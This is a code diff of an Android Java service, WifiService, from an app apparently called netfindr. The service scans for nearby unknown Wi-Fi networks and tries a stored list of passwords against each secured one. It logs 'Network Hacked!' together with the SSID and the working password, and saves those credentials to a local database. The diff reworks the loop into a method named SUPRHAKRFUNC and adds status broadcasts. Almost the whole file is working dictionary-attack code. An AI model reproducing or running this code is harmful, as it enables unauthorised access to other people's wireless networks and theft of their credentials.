@@ -12,6 +12,7 @@ import android.net.wifi.SupplicantState;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
+import android.support.v4.content.LocalBroadcastManager;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -36,16 +37,21 @@ import nz.frontdoor.netfindr.services.Password;
  * helper methods.
  */
 public class WifiService extends IntentService {
+    public static final String BROADCAST_ACTION = "nz.frontdoor.netfindr.WifiService";
+    public static final String EXTENDED_DATA_STATUS = "nz.frontdoor.netfindr.STATUS";
+
     private static final String TAG = "WIFISERVICE";
     public static Context context;
 
     private List<ScanResult> networks;
+    private List<Password> passwords;
 
     private WifiManager wifi;
     private BroadcastReceiver wifiScanReciver;
     private BroadcastReceiver wifiConnectionReciver;
 
     private ScanResult current;
+    private Boolean asociated = false;
     private CONNECTION_ATTEMPT_RESULT currentRes;
     private ThreadEvent scanComplete = new ThreadEvent();
     private Database database;
@@ -69,43 +75,8 @@ public class WifiService extends IntentService {
 
         networks = new ArrayList<>();
         database = new Database(context);
-
-        new SUPRHackrThrd().execute();
-
+        passwords = database.getPasswords();
         wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
-        wifiScanReciver = new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                List<ScanResult> scanResults;
-
-                synchronized (wifi) {
-                    scanResults = wifi.getScanResults();
-                }
-
-                int u = 0;
-                synchronized (networks) {
-                    for (ScanResult r : scanResults) {
-
-                        // TMP
-                        boolean e = false;
-                        for (ScanResult n : networks) {
-                            if (n.SSID.equals(r.SSID)) {
-                                e = true;
-                            }
-                        }
-
-
-                        if (!e && !database.isKnownNetwork(r.SSID)) {
-                            networks.add(r);
-                            u++;
-                        }
-                    }
-
-                    Log.v(TAG, "Scan Completed -> " + scanResults.size() + " networks found, " + u + " uniquic. [total = " + networks.size() + "]" );
-                }
-            }
-        };
-        context.registerReceiver(wifiScanReciver, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
 
         wifiConnectionReciver = new BroadcastReceiver() {
             @Override
@@ -114,22 +85,37 @@ public class WifiService extends IntentService {
                 switch(supl_state){
                     case ASSOCIATED:
                         Log.v("SupplicantState", "ASSOCIATED");
+                        synchronized (asociated) {
+                            asociated = true;
+                        }
                         break;
                     case ASSOCIATING:
                         Log.v("SupplicantState", "ASSOCIATING");
+                        synchronized (asociated) {
+                            asociated = true;
+                        }
                         break;
                     case AUTHENTICATING:
                         Log.v("SupplicantState", "Authenticating...");
                         break;
                     case COMPLETED:
                         Log.v("SupplicantState", "Connected");
+                        synchronized (asociated) {
+                            asociated = false;
+                        }
+
                         currentRes = CONNECTION_ATTEMPT_RESULT.SUCCESS;
                         scanComplete.signal();
                         break;
                     case DISCONNECTED:
                         Log.v("SupplicantState", "Disconnected");
-                        currentRes = CONNECTION_ATTEMPT_RESULT.FAILURE;
-                        scanComplete.signal();
+                        synchronized (asociated) {
+                            if (asociated) {
+                                currentRes = CONNECTION_ATTEMPT_RESULT.FAILURE;
+                                scanComplete.signal();
+                            }
+                        }
+
                         break;
                     case DORMANT:
                         Log.v("SupplicantState", "DORMANT");
@@ -184,92 +170,74 @@ public class WifiService extends IntentService {
                 wifi.setWifiEnabled(true);
             }
 
-            scan();
+            SUPRHAKRFUNC();
         }
     }
 
-    public int connect() {
-        WifiConfiguration wifiConfiguration = new WifiConfiguration();
-
-        return 0;
-    }
-
-    public void scan() {
+    private void SUPRHAKRFUNC() {
         // Start a peroic scan
         boolean s = wifi.startScan();
         Log.v(TAG, "Scan Status -> " + s);
-    }
 
-    private class SUPRHackrThrd extends AsyncTask<Void, Void, Void> {
-        List<Password> passwords = database.getPasswords();
 
-        @Override
-        protected Void doInBackground(Void... params) {
+        while (true) {
+            int id = -1;
+            scanNetworks();
 
-            while (true) {
-                ScanResult sr = null;
-                synchronized (networks) {
-                    if (!networks.isEmpty()) {
-                        sr = networks.remove(0);
-                    }
-                }
+            ScanResult sr = null;
+            if (!networks.isEmpty()) {
+                sr = networks.remove(0);
+            }
 
-                // Set the current network being looked at
-//                synchronized (current) {
-//                    current = sr;
-//                }
-
-                if (sr == null) {
-                    Log.v(TAG, "No networks to HAK... sleeping");
-                    try {
-                        Thread.sleep(10000, 0);
-                        continue;
-                    } catch (Exception e) {
-
-                    }
-                }
-
-                Log.v(TAG, "Scanning Network -> " + sr.SSID);
-                boolean success = false;
-
-                SECURITY_TYPE security_type = getSecurityType(sr);
-                Log.d(TAG, "Network Security -> " + security_type.toString());
-
-                if (security_type == SECURITY_TYPE.NONE) {
-                    Log.v(TAG, "Skipping Network... No Security");
+            if (sr == null) {
+                Log.v(TAG, "No networks to HAK... sleeping");
+                try {
+                    Thread.sleep(10000, 0);
                     continue;
+                } catch (Exception e) {
+
+                }
+            }
+
+            Log.v(TAG, "Scanning Network -> " + sr.SSID);
+
+
+            SECURITY_TYPE security_type = getSecurityType(sr);
+            Log.d(TAG, "Network Security -> " + security_type.toString());
+
+            if (security_type == SECURITY_TYPE.NONE) {
+                Log.v(TAG, "Skipping Network... No Security");
+                continue;
+            }
+
+            if (security_type == SECURITY_TYPE.DONT_EVEN) {
+                Log.v(TAG, "Skipping Network... Just NO. Just NOOOOOO");
+                continue;
+            }
+
+            boolean success = false;
+            for (Password password : passwords) {
+                WifiConfiguration wifiConfiguration = new WifiConfiguration();
+                wifiConfiguration.SSID = String.format("\"%s\"", sr.SSID);
+                wifiConfiguration.preSharedKey = String.format("\"%s\"", password.getPhrase());
+                wifiConfiguration.status = WifiConfiguration.Status.ENABLED;
+
+                synchronized (wifi) {
+                    id = wifi.addNetwork(wifiConfiguration);
+                    boolean enabled = wifi.enableNetwork(id, true);
                 }
 
-                if (security_type == SECURITY_TYPE.DONT_EVEN) {
-                    Log.v(TAG, "Skipping Network... Just NO. Just NOOOOOO");
-                    continue;
+                try {
+                    scanComplete.await();
+                } catch(InterruptedException e) {
+                    throw new RuntimeException();
                 }
 
-                for (Password password : passwords) {
-                    WifiConfiguration wifiConfiguration = new WifiConfiguration();
-                    wifiConfiguration.SSID = String.format("\"%s\"", sr.SSID);
-                    wifiConfiguration.preSharedKey = String.format("\"%s\"", password.getPhrase());
-                    wifiConfiguration.status = WifiConfiguration.Status.ENABLED;
-
-                    int id = -1;
-                    synchronized (wifi) {
-                        id = wifi.addNetwork(wifiConfiguration);
-                        boolean disconnect = wifi.disconnect();
-                        boolean enabled = wifi.enableNetwork(id, true);
-                        boolean reconnected = wifi.reconnect();
-                    }
-
-
-                    try {
-                        scanComplete.await();
-                    } catch(InterruptedException e) {
-                        throw new RuntimeException();
-                    }
-
-                    wifi.removeNetwork(id);
+                synchronized (currentRes) {
                     if (currentRes == CONNECTION_ATTEMPT_RESULT.SUCCESS) {
                         success = true;
                         Log.v(TAG, "Network Hacked!, SSID -> " + sr.SSID + ", password -> " + password.getPhrase());
+
                         database.addNetwork(Network.SuccessfulConnection(
                                 sr.SSID,
                                 password,
@@ -277,23 +245,61 @@ public class WifiService extends IntentService {
                                 security_type.toString(),
                                 new Date()
                         ));
+
+                        sendBroadcast();
+                        wifi.removeNetwork(id);
                         break;
                     } else {
                         Log.v(TAG, "Network Not Hacked, SSID -> " + sr.SSID + ", password -> " + password.getPhrase());
+                        wifi.removeNetwork(id);
+                        sendBroadcast();
                     }
                 }
-                if (!success) {
-                    database.addNetwork(Network.UnsuccessfulConnection(
-                            sr.SSID,
-                            0, 0,
-                            security_type.toString(),
-                            new Date()
-                    ));
+            }
+            if (!success) {
+                database.addNetwork(Network.UnsuccessfulConnection(
+                        sr.SSID,
+                        0, 0,
+                        security_type.toString(),
+                        new Date()));
+
+                wifi.removeNetwork(id);
+                sendBroadcast();
+            }
+        }
+    }
+
+    private void scanNetworks() {
+        List<ScanResult> scanResults;
+
+        synchronized (wifi) {
+            scanResults = wifi.getScanResults();
+        }
+
+        int u = 0;
+        for (ScanResult r : scanResults) {
+
+            // TMP
+            boolean e = false;
+            for (ScanResult n : networks) {
+                if (n.SSID.equals(r.SSID)) {
+                    e = true;
                 }
             }
 
-            //return null;
+
+            if (!e && !database.isKnownNetwork(r.SSID)) {
+                networks.add(r);
+                u++;
+            }
         }
+
+        Log.v(TAG, "Scan Completed -> " + scanResults.size() + " networks found, " + u + " uniquic. [total = " + networks.size() + "]");
+    }
+
+    private void sendBroadcast() {
+        Intent localIntent = new Intent(WifiService.BROADCAST_ACTION).putExtra(WifiService.EXTENDED_DATA_STATUS, "ALIVE");
+        LocalBroadcastManager.getInstance(context).sendBroadcast(localIntent);
     }
 
     private static SECURITY_TYPE getSecurityType(ScanResult s) {
